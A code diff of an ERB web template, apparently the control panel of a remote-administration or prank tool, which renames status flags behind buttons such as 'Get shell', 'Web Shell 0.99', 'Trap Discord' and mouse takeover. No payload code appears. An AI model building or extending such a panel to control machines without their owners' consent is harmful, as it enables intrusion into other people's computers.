@@ -14,7 +14,7 @@
       <p>Get shell</p></button>
     </form>
   </div>
-  <% if $clientsList[params[:client].to_i].mouseTaken == 1 %>
+  <% if $clientsList[params[:client].to_i].isMouseTaken == 1 %>
     <div class="box" id="active">
   <% else %>
     <div class="box">
@@ -62,7 +62,7 @@
       <p>Volume Control</p></button>
     </form>
   </div>
-  <% if $clientsList[params[:client].to_i].jiraTrap == 1 %>
+  <% if $clientsList[params[:client].to_i].isJiraTrapSet == 1 %>
     <div class="box" id="active">
   <% else %>
     <div class="box">
@@ -77,7 +77,7 @@
       <p>Trap Jira</p></button>
     </form>
   </div>
-  <% if $clientsList[params[:client].to_i].menuStart == 1 %>
+  <% if $clientsList[params[:client].to_i].isMenuStartTaken == 1 %>
     <div class="box" id="active">
   <% else %>
     <div class="box">
@@ -92,7 +92,7 @@
       <p>Get Menu Start</p></button>
     </form>
   </div>
-  <% if $clientsList[params[:client].to_i].discordTrap == 1 %>
+  <% if $clientsList[params[:client].to_i].isDiscordTrapSet == 1 %>
     <div class="box" id="active">
   <% else %>
     <div class="box">
@@ -140,7 +140,7 @@
       <p>Web Shell 0.99</p></button>
     </form>
   </div>
-  <% if $clientsList[params[:client].to_i].mouseSwappeed == 1 %>
+  <% if $clientsList[params[:client].to_i].areMouseButtonsSwapped == 1 %>
     <div class="box" id="active">
   <% else %>
     <div class="box">
